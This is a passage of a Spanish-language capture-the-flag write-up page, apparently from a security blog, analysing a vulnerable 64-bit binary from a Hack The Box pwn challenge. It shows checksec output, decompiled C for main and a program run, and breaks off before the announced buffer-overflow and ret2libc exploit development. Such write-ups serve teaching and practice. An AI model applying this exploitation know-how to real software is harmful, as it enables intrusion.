@@ -1,0 +1,658 @@
+<!doctype html><html lang="es"><head><title>Sacred Scrolls: Revenge | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="Binario de 64 bits. Buffer Overflow. Ret2Libc"><meta itemprop="description" content="Binario de 64 bits. Buffer Overflow. Ret2Libc"><meta name="twitter:card" content="Binario de 64 bits. Buffer Overflow. Ret2Libc"><meta name="twitter:description" content="Binario de 64 bits. Buffer Overflow. Ret2Libc"><meta property="og:description" content="Binario de 64 bits. Buffer Overflow. Ret2Libc"><meta property="og:type" content="website"><meta name="robots" content="index, follow"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="image" content="https://7rocky.github.io/images/pwn.png"><meta name="twitter:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta itemprop="name" content="Sacred Scrolls: Revenge"><meta property="twitter:title" content="Sacred Scrolls: Revenge"><meta property="og:title" content="Sacred Scrolls: Revenge"><meta property="og:url" content="https://7rocky.github.io/ctf/htb-challenges/pwn/sacred-scrolls-revenge/"><meta itemprop="keywords" content><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/monokai-sublime.min.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><script src="/js/highlight.min.js"></script>
+<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px"></a>
+<a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/ctf/htb-challenges/pwn/sacred-scrolls-revenge/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- PWN</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/ctf/htb-challenges/pwn/sacred-scrolls-revenge/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/ctf/htb-challenges/pwn/sacred-scrolls-revenge/&text=Sacred%20Scrolls:%20Revenge" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/ctf/htb-challenges/pwn/sacred-scrolls-revenge/&title=Sacred%20Scrolls:%20Revenge" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Sacred Scrolls: Revenge</h1><p class="mb4 f6 dib tracked">17 minutos de lectura</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#ingeniería-inversa">Ingeniería inversa</a><ul><li><a href="#opción-para-subir-archivos">Opción para subir archivos</a></li><li><a href="#opción-para-leer-archivos">Opción para leer archivos</a></li><li><a href="#opción-para-guardar-archivo">Opción para guardar archivo</a></li><li><a href="#vulnerabilidad-de-_buffer-overflow_">Vulnerabilidad de <em>Buffer Overflow</em></a></li></ul></li><li><a href="#estrategia-de-explotación">Estrategia de explotación</a></li><li><a href="#desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></a><ul><li><a href="#depurando-el-_exploit_">Depurando el <em>exploit</em></a></li></ul></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>Se nos proporciona un binario de 64 bits llamado <code>sacred_scrolls</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Arch:     amd64-64-little
+RELRO:    <span class="code-dark-green">Full RELRO</span>
+Stack:    <span class="code-dark-red">No canary found</span>
+NX:       <span class="code-dark-green">NX enabled</span>
+PIE:      <span class="code-dark-red">No PIE (0x400000)</span>  
+RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
+</code></pre></div><h2 id="ingeniería-inversa">Ingeniería inversa</h2><p>Usando Ghidra, podemos leer el código fuente descompilado en C. Esta es la función <code>main</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>
+<span class="mtk1">  undefined8 </span><span class="mtk5">*</span><span class="mtk1">puVar1;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> i;</span>
+<span class="mtk1">  byte bVar2;</span>
+<span class="mtk1">  undefined wizard_tag[</span><span class="mtk6">1528</span><span class="mtk1">];</span>
+<span class="mtk1">  undefined8 uStack_110;</span>
+<span class="mtk1">  undefined8 target;</span>
+<span class="mtk1">  undefined8 local_100;</span>
+<span class="mtk1">  undefined8 local_f8;</span>
+<span class="mtk1">  undefined8 local_f0;</span>
+<span class="mtk1">  undefined8 local_e8;</span>
+<span class="mtk1">  undefined8 local_e0;</span>
+<span class="mtk1">  undefined8 local_d8;</span>
+<span class="mtk1">  undefined8 local_d0;</span>
+<span class="mtk1">  undefined8 local_c8;</span>
+<span class="mtk1">  undefined8 local_c0;</span>
+<span class="mtk1">  undefined8 local_b8;</span>
+<span class="mtk1">  undefined8 local_b0;</span>
+<span class="mtk1">  undefined8 local_a8;</span>
+<span class="mtk1">  undefined8 local_a0;</span>
+<span class="mtk1">  undefined8 local_98;</span>
+<span class="mtk1">  undefined8 local_90;</span>
+<span class="mtk1">  undefined8 local_88;</span>
+<span class="mtk1">  undefined8 local_80;</span>
+<span class="mtk1">  undefined8 local_78;</span>
+<span class="mtk1">  undefined8 local_70;</span>
+<span class="mtk1">  undefined8 local_68;</span>
+<span class="mtk1">  undefined8 local_60;</span>
+<span class="mtk1">  undefined8 local_58;</span>
+<span class="mtk1">  undefined8 local_50;</span>
+<span class="mtk1">  undefined8 local_48;</span>
+<span class="mtk1">  undefined </span><span class="mtk5">*</span><span class="mtk1">wizard_tag_copy;</span>
+<span class="mtk1">  undefined8 local_38;</span>
+<span class="mtk1">  undefined4 local_2c;</span>
+
+<span class="mtk1">  bVar2 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">  uStack_110 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">400efa</span><span class="mtk1">;</span>
+<span class="mtk1">  </span><span class="mtk8">setup</span><span class="mtk1">();</span>
+<span class="mtk1">  uStack_110 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">400eff</span><span class="mtk1">;</span>
+<span class="mtk1">  </span><span class="mtk8">banner</span><span class="mtk1">();</span>
+<span class="mtk1">  uStack_110 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">400f09</span><span class="mtk1">;</span>
+<span class="mtk1">  </span><span class="mtk8">clean</span><span class="mtk1">();</span>
+<span class="mtk1">  uStack_110 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">400f1a</span><span class="mtk1">;</span>
+<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">Enter your wizard tag: "</span><span class="mtk1">);</span>
+<span class="mtk1">  local_2c </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">600</span><span class="mtk1">;</span>
+<span class="mtk1">  local_38 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">5ff</span><span class="mtk1">;</span>
+
+<span class="mtk1">  wizard_tag_copy </span><span class="mtk5">=</span><span class="mtk1"> wizard_tag;</span>
+<span class="mtk1">  </span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, wizard_tag, </span><span class="mtk6">1535</span><span class="mtk1">);</span>
+
+<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">Interact with magic library </span><span class="mtk6">%s</span><span class="mtk4">"</span><span class="mtk1">, wizard_tag_copy);</span>  
+<span class="mtk1">  puVar1 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">&amp;</span><span class="mtk1">target;</span>
+
+<span class="mtk1">  </span><span class="mtk5">for</span><span class="mtk1"> (i </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">25</span><span class="mtk1">; i </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; i</span><span class="mtk5">--</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk5">*</span><span class="mtk1">puVar1 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">    puVar1 </span><span class="mtk5">=</span><span class="mtk1"> puVar1 </span><span class="mtk5">+</span><span class="mtk1"> (ulong)bVar2 </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk6">2</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  </span><span class="mtk5">while</span><span class="mtk1"> (</span><span class="mtk6">true</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk5">while</span><span class="mtk1"> (i </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">menu</span><span class="mtk1">(), i </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">) {</span>
+<span class="mtk1">      puVar1 </span><span class="mtk5">=</span><span class="mtk1"> (undefined8 </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk8">spell_read</span><span class="mtk1">();</span>
+<span class="mtk1">      target </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">puVar1;</span>
+<span class="mtk1">      local_100 </span><span class="mtk5">=</span><span class="mtk1"> puVar1[</span><span class="mtk6">1</span><span class="mtk1">];</span>
+<span class="mtk1">      local_f8 </span><span class="mtk5">=</span><span class="mtk1"> puVar1[</span><span class="mtk6">2</span><span class="mtk1">];</span>
+<span class="mtk1">      local_f0 </span><span class="mtk5">=</span><span class="mtk1"> puVar1[</span><span class="mtk6">3</span><span class="mtk1">];</span>
+<span class="mtk1">      local_e8 </span><span class="mtk5">=</span><span class="mtk1"> puVar1[</span><span class="mtk6">4</span><span class="mtk1">];</span>
+<span class="mtk1">      local_e0 </span><span class="mtk5">=</span><span class="mtk1"> puVar1[</span><span class="mtk6">5</span><span class="mtk1">];</span>
+<span class="mtk1">      local_d8 </span><span class="mtk5">=</span><span class="mtk1"> puVar1[</span><span class="mtk6">6</span><span class="mtk1">];</span>
+<span class="mtk1">      local_d0 </span><span class="mtk5">=</span><span class="mtk1"> puVar1[</span><span class="mtk6">7</span><span class="mtk1">];</span>
+<span class="mtk1">      local_c8 </span><span class="mtk5">=</span><span class="mtk1"> puVar1[</span><span class="mtk6">8</span><span class="mtk1">];</span>
+<span class="mtk1">      local_c0 </span><span class="mtk5">=</span><span class="mtk1"> puVar1[</span><span class="mtk6">9</span><span class="mtk1">];</span>
+<span class="mtk1">      local_b8 </span><span class="mtk5">=</span><span class="mtk1"> puVar1[</span><span class="mtk6">10</span><span class="mtk1">];</span>
+<span class="mtk1">      local_b0 </span><span class="mtk5">=</span><span class="mtk1"> puVar1[</span><span class="mtk5">0x</span><span class="mtk6">b</span><span class="mtk1">];</span>
+<span class="mtk1">      local_a8 </span><span class="mtk5">=</span><span class="mtk1"> puVar1[</span><span class="mtk5">0x</span><span class="mtk6">c</span><span class="mtk1">];</span>
+<span class="mtk1">      local_a0 </span><span class="mtk5">=</span><span class="mtk1"> puVar1[</span><span class="mtk5">0x</span><span class="mtk6">d</span><span class="mtk1">];</span>
+<span class="mtk1">      local_98 </span><span class="mtk5">=</span><span class="mtk1"> puVar1[</span><span class="mtk5">0x</span><span class="mtk6">e</span><span class="mtk1">];</span>
+<span class="mtk1">      local_90 </span><span class="mtk5">=</span><span class="mtk1"> puVar1[</span><span class="mtk5">0x</span><span class="mtk6">f</span><span class="mtk1">];</span>
+<span class="mtk1">      local_88 </span><span class="mtk5">=</span><span class="mtk1"> puVar1[</span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">];</span>
+<span class="mtk1">      local_80 </span><span class="mtk5">=</span><span class="mtk1"> puVar1[</span><span class="mtk5">0x</span><span class="mtk6">11</span><span class="mtk1">];</span>
+<span class="mtk1">      local_78 </span><span class="mtk5">=</span><span class="mtk1"> puVar1[</span><span class="mtk5">0x</span><span class="mtk6">12</span><span class="mtk1">];</span>
+<span class="mtk1">      local_70 </span><span class="mtk5">=</span><span class="mtk1"> puVar1[</span><span class="mtk5">0x</span><span class="mtk6">13</span><span class="mtk1">];</span>
+<span class="mtk1">      local_68 </span><span class="mtk5">=</span><span class="mtk1"> puVar1[</span><span class="mtk5">0x</span><span class="mtk6">14</span><span class="mtk1">];</span>
+<span class="mtk1">      local_60 </span><span class="mtk5">=</span><span class="mtk1"> puVar1[</span><span class="mtk5">0x</span><span class="mtk6">15</span><span class="mtk1">];</span>
+<span class="mtk1">      local_58 </span><span class="mtk5">=</span><span class="mtk1"> puVar1[</span><span class="mtk5">0x</span><span class="mtk6">16</span><span class="mtk1">];</span>
+<span class="mtk1">      local_50 </span><span class="mtk5">=</span><span class="mtk1"> puVar1[</span><span class="mtk5">0x</span><span class="mtk6">17</span><span class="mtk1">];</span>
+<span class="mtk1">      local_48 </span><span class="mtk5">=</span><span class="mtk1"> puVar1[</span><span class="mtk6">24</span><span class="mtk1">];</span>
+<span class="mtk1">      </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00401f80,</span><span class="mtk5">&amp;</span><span class="mtk1">target);</span>
+<span class="mtk1">    }</span>
+
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (i </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">3</span><span class="mtk1">) </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (i </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">) {</span>
+<span class="mtk1">      </span><span class="mtk8">spell_upload</span><span class="mtk1">();</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  </span><span class="mtk8">spell_save</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">target);</span>
+<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
+<span class="mtk1">  </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">16</span><span class="mtk1">);</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Aquí se nos pide que ingresemos la etiqueta del mago y luego tenemos un menú con tres opciones:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./sacred_scrolls</span>
+
+
+<span class="code-blue">                                            ▄▞▀▀▀▜▄▖</span>
+<span class="code-blue">          ▗     ▖       ▗     ▖       ▗  ▖▟▞▖▘▗▖▚▘ ▝▀▄</span>
+<span class="code-blue">   ▖▝  ▘ ▝   ▝    ▝  ▘ ▝   ▝    ▝  ▘ ▝ ▖▌▀ ▖▖▚▘▝▗▝▝ ▗▝▄▖▘ ▘</span>  
+<span class="code-blue">                                   ▗▗▞▘▚▝▝▝▗▝  ▘   ▖  ▗▚▖</span>
+<span class="code-blue">              ▗  ▖  ▗       ▗  ▖▗▄▜▝▚▝▝▖▘▘▝   ▖ ▖ ▘ ▗ ▖▛▞</span>
+<span class="code-blue">   ▖  ▖▘ ▖ ▗ ▘         ▖ ▗▝  ▗▄▞▚▗▗▘ ▝           ▖ ▖ ▖▘▀▀▖</span>
+<span class="code-blue">                   ▖      ▗▖▛▚▗▝ ▖        ▗ ▝ ▝ ▘ ▖ ▘▗▗▗▝▌</span>
+<span class="code-blue">                 ▗    ▗▄▞▀▚▝ ▖          ▖▝  ▖▝ ▖▗ ▖▘▝▗▗▄▞▘</span>
+<span class="code-blue">  ▖ ▝     ▗     ▖  ▄▞▀▚▗▝▝  ▖        ▘ ▘ ▗▝ ▖ ▘▗▗▝▖▞▞▌▜▐▐▖</span>
+<span class="code-blue">        ▗     ▘▄▖▀▀▗▝▝▗ ▝         ▗ ▘ ▖▖▘▖▝▗ ▚▝▖▖▌▌▌▙▞▌▀</span>
+<span class="code-blue">       ▘   ▄▞▞▀▗▝▞▝▖▝           ▘▝  ▖▘▖▖▘▞▝▖▚▚▐▐▟▟▞▘▘</span>
+<span class="code-blue">    ▖▝ ▄▖▛▀▖▞▖▌▘▘▝▖      ▖▝ ▗ ▝ ▖▗ ▘▖▖▖▞▐▗▚▚▙▙▛▀▝</span>
+<span class="code-blue">   ▄▄▜▚▙▄▄▀▝▗ ▄▝▝▘  ▘ ▘ ▘    ▗ ▖▗ ▝▖▄▐▐▐▟▟▜▜▝             ▘</span>
+<span class="code-blue">  ▐▟▛█▜▚▚▚▞▄▖▘     ▖  ▗  ▗ ▘▝ ▖▗▗▐▝▄▟▞▙█▐▝</span>
+<span class="code-blue">  ▐▚▛▞▜▚▟ ▝▚▚ ▘▝ ▝  ▝▗ ▖▘ ▗▝▝▖▞▖▌▙▜▙▙▀▘      ▗ ▝     ▗  ▘</span>
+<span class="code-blue">  ▜▐▚▐▐▜▟█▖ ▀▙▖▗ ▖▗▝ ▖▗ ▖▘▖▞▞▟▞▛▛▟▀        ▗        ▘     ▖</span>
+<span class="code-blue">  ▝▛▗ ▖▌▙▙█▘ ▗▚ ▖▗ ▗▗▗▗▚▐▐▐▞▛▟▞▛▝                ▗▝</span>
+<span class="code-blue">   █ ▖▗▀▝▝▛█▗ ▜▘▖▗▝▗▗▚▚▚▙▜▞▙▜▝        ▝  ▘     ▗        ▖</span>
+<span class="code-blue">   ▐▖▖ ▚ ▚▜▜▖▞▐▚▗▗▐▗▜▞▛▙▚▙▀         ▝      ▗ ▘        ▗</span>
+<span class="code-blue">    ▚▝▖▚▚▖▀▛▞▐▟▚▘▌▌▛▙▜▟▝▘         ▗                  ▗</span>
+<span class="code-blue">  ▗ ▝▌▝▖▌▜▚▛▟█▛▙▜▞▛▛▞▘                ▖ ▝        ▖ ▗▝     ▘</span>
+<span class="code-blue">     ▝▙▗▐▐▐▜▜▙█▞▟▞▛▝             ▗   ▖    ▗  ▗ ▝</span>
+<span class="code-blue">     ▝▘▌▖▖▙▀▙▜▚▜▝             ▗ ▘</span>
+<span class="code-blue">        ▝▀▗▀▞▞▘▘      ▝  ▘ ▗▝           ▗               ▝</span>
+<span class="code-blue">  ▝ ▝            ▗▝                 ▘      ▝  ▝   ▖▝</span>
+<span class="code-blue">                                       ▘              ▝</span>
+
+
+<span class="code-green">[+] All ⅀ ℙ ∉ ⎳ ⎳ ⅀ have been whiped out..</span>
+
+<span class="code-blue">Enter your wizard tag: asdf</span>
+
+<span class="code-blue">Interact with magic library asdf</span>
+
+<span class="code-blue">1. Upload ⅀ ℙ ∉ ⎳ ⎳</span>
+<span class="code-blue">2. Read   ⅀ ℙ ∉ ⎳ ⎳</span>
+<span class="code-blue">2. Cast   ⅀ ℙ ∉ ⎳ ⎳</span>
+<span class="code-blue">3. Leave</span>
+
+<span class="code-blue">&gt;&gt;</span>
+</code></pre></div><h3 id="opción-para-subir-archivos">Opción para subir archivos</h3><p>La primera opción se gestiona con <code>spell_upload</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">spell_upload</span><span class="mtk1">() {</span>
